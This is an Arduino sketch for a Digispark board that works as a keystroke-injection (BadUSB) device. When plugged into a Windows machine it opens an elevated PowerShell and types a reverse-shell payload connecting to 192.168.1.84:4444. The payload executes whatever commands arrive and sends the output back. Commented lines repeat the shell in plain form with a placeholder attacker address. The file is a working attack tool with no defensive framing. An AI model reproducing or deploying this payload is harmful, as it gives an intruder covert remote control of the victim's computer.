#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(100);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(150);
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell /noexit /command @mode con cols)18 lines)1@");
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill &IM @taskmgr.exe@ &F ");
  DigiKeyboard.delay(100);
  //DigiKeyboard.println("cmd");
  //DigiKeyboard.delay(1500);
  //DigiKeyboard.println("powershell -windowstyle hidden -command \"$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP_ADDRESS>',4444);$stream = $client.GetStream();
  //[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  //$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  //$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
  //DigiKeyboard.print(F("powershell /windowstyle hidden /command @$client ) New/Object System.Net.Sockets.TCPClient*@192.168.1.56@,4444(<$stream ) $client.GetStream*(<"));
  DigiKeyboard.print(F("$client ) New/Object System.Net.Sockets.TCPClient*@192.168.1.84@,4444(<$stream ) $client.GetStream*(<"));
  DigiKeyboard.sendKeyStroke(47, MOD_ALT_RIGHT);DigiKeyboard.print("byte");
  DigiKeyboard.sendKeyStroke(47, MOD_ALT_RIGHT);DigiKeyboard.sendKeyStroke(48, MOD_ALT_RIGHT);DigiKeyboard.sendKeyStroke(48, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("$bytes ) 0..65535"));DigiKeyboard.sendKeyStroke(30, MOD_ALT_RIGHT);DigiKeyboard.print(F("%"));
  DigiKeyboard.sendKeyStroke(52, MOD_ALT_RIGHT);DigiKeyboard.print("0");DigiKeyboard.sendKeyStroke(50, MOD_ALT_RIGHT);DigiKeyboard.println();
  
  DigiKeyboard.print(F("while**$i ) $stream.Read*$bytes, 0, $bytes.Length(( /ne 0("));DigiKeyboard.sendKeyStroke(52, MOD_ALT_RIGHT);
  DigiKeyboard.print(F("<$data ) *New/Object /TypeName System.Text.ASCIIEncoding(.GetString*$bytes,0, $i(<$sendback ) *iex $data 2"));
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_RIGHT);DigiKeyboard.print(F("^1 "));DigiKeyboard.sendKeyStroke(30, MOD_ALT_RIGHT);DigiKeyboard.print(F(" Out/String (<$sendback2 ) $sendback "));
  DigiKeyboard.sendKeyStroke(87, MOD_SHIFT_RIGHT);DigiKeyboard.print(F(" @PS @ "));DigiKeyboard.sendKeyStroke(87, MOD_SHIFT_RIGHT);
  DigiKeyboard.print(F(" *pwd(.Path "));DigiKeyboard.sendKeyStroke(87, MOD_SHIFT_RIGHT);DigiKeyboard.print(" @");DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_RIGHT);
  DigiKeyboard.print(F(" @<$sendbyte ) *"));DigiKeyboard.sendKeyStroke(47, MOD_ALT_RIGHT);DigiKeyboard.print(F("text.encoding"));
  DigiKeyboard.sendKeyStroke(48, MOD_ALT_RIGHT);DigiKeyboard.print(F(">>ASCII(.GetBytes*$sendback2(<$stream.Write*$sendbyte,0,$sendbyte.Length(<$stream.Flush*("));
  DigiKeyboard.sendKeyStroke(50, MOD_ALT_RIGHT);
  //DigiKeyboard.println(F("<$client.Close*(@"));
  DigiKeyboard.println(F("<$client.Close*("));
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(80085);
}